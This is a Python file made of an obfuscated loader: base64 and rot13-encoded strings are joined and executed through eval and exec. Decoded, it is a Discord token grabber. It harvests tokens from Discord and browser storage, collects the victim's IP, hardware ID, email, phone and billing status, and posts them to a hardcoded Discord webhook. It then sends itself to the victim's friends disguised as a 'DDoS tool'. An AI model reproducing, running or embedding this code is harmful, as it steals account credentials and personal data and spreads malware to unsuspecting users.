import base64, codecs
magic = 'DQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBvcw0KaW1wb3J0IGN0eXBlcw0KZnJvbSByZSBpbXBvcnQgZmluZGFsbA0KZnJvbSBqc29uIGltcG9ydCBsb2FkcywgZHVtcHMNCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUNCmZyb20gc3VicHJvY2VzcyBpbXBvcnQgUG9wZW4sIFBJUEUNCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4NCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQNCmZyb20gdGltZSBpbXBvcnQgc2xlZXANCmZyb20gc3lzIGltcG9ydCBhcmd2DQpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBpbml0DQppbml0KGNvbnZlcnQ9VHJ1ZSkNCmNsZWFyID0gbGFtYmRhOiBvcy5zeXN0ZW0oJ2NscycpDQoNCldFQkhPT0tfVVJMID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzg5Mzg0MTEyMTczMjU5MTYyNi9iVFhUT3IzLUhtd3FwdEd6bHdna0RHcXdLeDgyeUFxRFlDNkRQcVlBcGswYWtDTDRXTVU2YTVGNTJTOUVKNHR6NlI1ciIgIyBJbnNlcnQgd2ViaG9vayB1cmwgaGVyZQ0KDQpMT0NBTCA9IG9zLmdldGVudigiTE9DQUxBUFBEQVRBIikNClJPQU1JTkcgPSBvcy5nZXRlbnYoIkFQUERBVEEiKQ0KUEFUSFMgPSB7DQogICAgIkRpc2NvcmQiOiBST0FNSU5HICsgIlxcRGlzY29yZCIsDQogICAgIkRpc2NvcmQgQ2FuYXJ5IjogUk9BTUlORyArICJcXGRpc2NvcmRjYW5hcnkiLA0KICAgICJEaXNjb3JkIFBUQiI6IFJPQU1JTkcgKyAiXFxkaXNjb3JkcHRiIiwNCiAgICAiR29vZ2xlIENocm9tZSI6IExPQ0FMICsgIlxcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCIsDQogICAgIk9wZXJhIjogUk9BTUlORyArICJcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGUiLA0KICAgICJCcmF2ZSI6IExPQ0FMICsgIlxcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0IiwNCiAgICAiWWFuZGV4IjogTE9DQUwgKyAiXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCINCn0NCg0KDQpkZWYgZ2V0SGVhZGVyKHRva2VuPU5vbmUsIGNvbnRlbnRfdHlwZT0iYXBwbGljYXRpb24vanNvbiIpOg0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiBjb250ZW50X3R5cGUsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzQ0LjAuMjQwMy4xNTcgU2FmYXJpLzUzNy4zNiINCiAgICB9DQogICAgaWYgdG9rZW46DQogICAgICAgIGhlYWRlcnMudXBkYXRlKHsiQXV0aG9yaXphdGlvbiI6IHRva2VufSkNCiAgICByZXR1cm4gaGVhZGVycw0KDQoNCmRlZiBnZXRVc2VyRGF0YSh0b2tlbik6DQogICAgdHJ5Og0KICAgICAgICByZXR1cm4gbG9hZHMoDQogICAgICAgICAgICB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9Z2V0SGVhZGVyKHRva2VuKSkpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICBleGNlcHQ6DQogICAgICAgIHBhc3MNCg0KDQpkZWYgZ2V0VG9rZW56KHBhdGgpOg0KICAgIHBhdGggKz0gIlxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYiINCiAgICB0b2tlbnMgPSBbXQ0KICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToNCiAgICAgICAgaWYgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgiLmxvZyIpIGFuZCBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCIubGRiIik6DQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aH1cXHtmaWxlX25hbWV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI3fSIsIHIibWZhXC5bXHctXXs4NH0iKToNCiAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gZmluZGFsbChyZWdleCwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgIHRva2Vucy5hcHBlbmQodG9rZW4pDQogICAgcmV0dXJuIHRva2Vucw0KDQoNCmRlZiB3aG9UaGVGdWNrQW1JKCk6DQogICAgaXAgPSAiTm9uZSINCiAgICB0cnk6DQogICAgICAgIGlwID0gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2lmY29uZmlnLm1lIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQogICAgcmV0dXJuIGlwDQoNCg0KZGVmIGhXaUQoKToNCiAgICBwID0gUG9wZW4oIndtaWMgY3Nwcm9kdWN0IGdldCB1dWlkIiwgc2hlbGw9VHJ1ZSwgc3RkaW49UElQRSwgc3Rkb3V0PVBJUEUsIHN0ZGVycj1QSVBFKQ0KICAgIHJldHVybiAocC5zdGRvdXQucmVhZCgpICsgcC5zdGRlcnIucmVhZCgpKS5kZWNvZGUoKS5zcGxpdCgiXG4iKVsxXQ0KDQoNCmRlZiBnZXRGcmllbmRzKHRva2VuKToNCiAgICB0cnk6DQogICAgICAgIHJldHVybiBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXJzPWdldEhlYWRlcih0b2tlbikpKS5yZWFkKCku'
love = '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'
god = 'YXRhWyJpZCJdDQogICAgICAgICAgICBlbWFpbCA9IHVzZXJfZGF0YS5nZXQoImVtYWlsIikNCiAgICAgICAgICAgIHBob25lID0gdXNlcl9kYXRhLmdldCgicGhvbmUiKQ0KICAgICAgICAgICAgbml0cm8gPSBib29sKHVzZXJfZGF0YS5nZXQoInByZW1pdW1fdHlwZSIpKQ0KICAgICAgICAgICAgYmlsbGluZyA9IGJvb2wocGF5bWVudE1ldGhvZHModG9rZW4pKQ0KICAgICAgICAgICAgZW1iZWQgPSB7DQogICAgICAgICAgICAgICAgImNvbG9yIjogMHg3Mjg5ZGEsDQogICAgICAgICAgICAgICAgImZpZWxkcyI6IFsNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAifEFjY291bnQgSW5mb3wiLA0KICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZidFbWFpbDoge2VtYWlsfVxuUGhvbmU6IHtwaG9uZX1cbk5pdHJvOiB7bml0cm99XG5CaWxsaW5nIEluZm86IHtiaWxsaW5nfScsDQogICAgICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJ8UEMgSW5mb3wiLA0KICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZidJUDoge2lwfVxuVXNlcm5hbWU6IHtwY191c2VybmFtZX1cblBDIE5hbWU6IHtwY19uYW1lfVxuVG9rZW4gTG9jYXRpb246IHtwbGF0Zm9ybX0nLA0KICAgICAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUNCiAgICAgICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAifFRva2VufCIsDQogICAgICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiB0b2tlbiwNCiAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBGYWxzZQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICAgICAiYXV0aG9yIjogew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzZXJuYW1lfSAoe3VzZXJfaWR9KSIsDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAiZm9vdGVyIjogew0KICAgICAgICAgICAgICAgICAgICAidGV4dCI6IGYiVmlzaXQgbXkgd2Vic2l0ZSBmb3IgbW9yZSBDeWJlcnNlY3VyaXR5IGNvbnRlbnRzOiB1bjV0NDhsMy5jb20iDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZW1iZWRzLmFwcGVuZChlbWJlZCkNCiAgICB3aXRoIG9wZW4oY2FjaGVfcGF0aCwgImEiKSBhcyBmaWxlOg0KICAgICAgICBmb3IgdG9rZW4gaW4gY2hlY2tlZDoNCiAgICAgICAgICAgIGlmIG5vdCB0b2tlbiBpbiBhbHJlYWR5X2NhY2hlZF90b2tlbnM6DQogICAgICAgICAgICAgICAgZmlsZS53cml0ZSh0b2tlbiArICJcbiIpDQogICAgaWYgbGVuKHdvcmtpbmcpID09IDA6DQogICAgICAgIHdvcmtpbmcuYXBwZW5kKCcxMjMnKQ0KICAgIHdlYmhvb2sgPSB7DQogICAgICAgICJjb250ZW50IjogIiIsDQogICAgICAgICJlbWJlZHMiOiBlbWJlZHMsDQogICAgICAgICJ1c2VybmFtZSI6ICJEaXNjb3JkIFRva2VuIEdyYWJiZXIiLA0KICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL21laG1ldGNhbnlpbGRpei5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMjAvMTEvYmxhY2sucG5nIg0KICAgIH0NCiAgICB0cnk6DQogICAgICAgIA0KICAgICAgICB1cmxvcGVuKFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9ZHVtcHMod2ViaG9vaykuZW5jb2RlKCksIGhlYWRlcnM9Z2V0SGVhZGVyKCkpKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KICAgIGlmIHNlbGZfc3ByZWFkOg0KICAgICAgICBmb3IgdG9rZW4gaW4gd29ya2luZzoNCiAgICAgICAgICAgIHdpdGggb3Blbihhcmd2WzBdLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmaWxlOg0KICAgICAgICAgICAgICAgIGNvbnRlbnQgPSBmaWxlLnJlYWQoKQ0KICAgICAgICAgICAgcGF5bG9hZCA9IGYnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0zMjU0MTQ1MzcwMzAzMjkzMjAxNTEzOTQ4NDM2ODdcbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJ7X19maWxlX199IlxuQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluXG5cbntjb250ZW50fVxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0zMjU0MTQ1MzcwMzAzMjkzMjAxNTEzOTQ4NDM2ODdcbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iY29udGVudCJcblxuRERvUyB0b29sLiBweXRob24gZG93bmxvYWQ6IGh0dHBzOi8vd3d3LnB5dGhvbi5vcmcvZG93bmxvYWRzXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTMyNTQxNDUzNzAzMDMyOTMyMDE1MTM5NDg0MzY4N1xuQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ0dHMiXG5cbmZhbHNlXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTMyNTQxNDUzNzAzMDMyOTMyMDE1MTM5NDg0MzY4Ny0tJw0KICAgICAgICAgICAgVGhyZWFkKHRhcmdldD1zcHJlYWQsIGFyZ3M9KHRva2VuLCBwYXlsb2FkLCA3NTAwIC8gMTAwMCkpLnN0YXJ0KCkNCg0KDQp0cnk6DQogICAgbWFpbigpDQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))